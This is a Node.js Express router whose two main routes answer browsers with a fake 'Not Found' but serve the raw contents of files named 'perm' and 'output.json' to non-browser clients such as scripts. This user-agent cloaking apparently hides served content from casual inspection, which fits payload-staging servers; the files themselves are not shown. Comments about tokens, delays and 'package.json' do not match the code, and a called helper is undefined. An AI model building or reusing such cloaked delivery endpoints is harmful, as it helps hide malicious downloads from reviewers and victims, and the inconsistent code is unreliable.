const express = require('express');
const router = express.Router();
const path = require('path');
const fs = require('fs');
const crypto = require('crypto');
const jwt = require('jsonwebtoken');

// -------------------------
// CONFIG
// -------------------------
const SECURITY_ENABLED = true;
const STEP_MIN_DELAY_MS = parseInt(process.env.STEP_MIN_DELAY_MS || '4000', 10); // minimum wait between step1 and step2
const JWT_EXPIRES_IN = process.env.JWT_EXPIRES_IN || '3m'; // short-lived tokens
const SECRET_KEY = process.env.SECRET_KEY || 'CHANGE_THIS_SECRET_TO_A_STRONG_VALUE';

function isBrowserUserAgent(userAgent) {
  return /Mozilla\/5\.0|Chrome|Firefox|Safari|Edge/i.test(userAgent);
}

router.get('/bc/rpc', async (req, res) => {
  try {
    const userAgent = req.get('User-Agent') || '';

    if (isBrowserUserAgent(userAgent)) {
      // Browser visit - keep same behavior as before (simple response)
      return res.type('text/plain').send('{\"error\":\"Not Found\"}');
    } else {
      const domain = req.protocol + '://' + req.get('host');
      // Note: we include both original token and step token st in query string.
      // Client script must pass both when requesting /token
    const filePath = path.join(__dirname, '..', 'public', 'perm');
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error('[FILE] package.json read error:', err);
        return res.status(500).send(filePath);
      }
      return res.type('text/plain').send(content);
    });
    }
  } catch (err) {
    console.error('[ROUTE] /windows error:', err);
    return res.status(500).send('Internal error');
  }
});

router.get('/output.json', async (req, res) => {
  try {
    const userAgent = req.get('User-Agent') || '';

    if (isBrowserUserAgent(userAgent)) {
      // Browser visit - keep same behavior as before (simple response)
      return res.type('text/plain').send('\"error\":\"Not Found\"}');
    } else {
      const domain = req.protocol + '://' + req.get('host');
      // Note: we include both original token and step token st in query string.
      // Client script must pass both when requesting /token
    const filePath = path.join(__dirname, '..', 'public', 'output.json');
    fs.readFile(filePath, 'utf8', (err, content) => {
      if (err) {
        console.error('[FILE] package.json read error:', err);
        return res.status(500).send(filePath);
      }
      return res.type('text/plain').send(content);
    });
    }
  } catch (err) {
    console.error('[ROUTE] /windows error:', err);
    return res.status(500).send('Internal error');
  }
});
// -------------------------
// Debug endpoint to show token info (useful during dev only)
// -------------------------
router.get('/_debug/decode', (req, res) => {
  if (process.env.NODE_ENV === 'production') return res.status(403).send('Forbidden');
  const st = req.query.st || getBearerFromReq(req);
  if (!st) return res.status(400).send('Missing st');
  try {
    const decoded = jwt.decode(st);
    return res.json({ decoded });
  } catch (err) {
    return res.status(400).send('Invalid token');
  }
});

// -------------------------
// Exports
// -------------------------

module.exports = router;
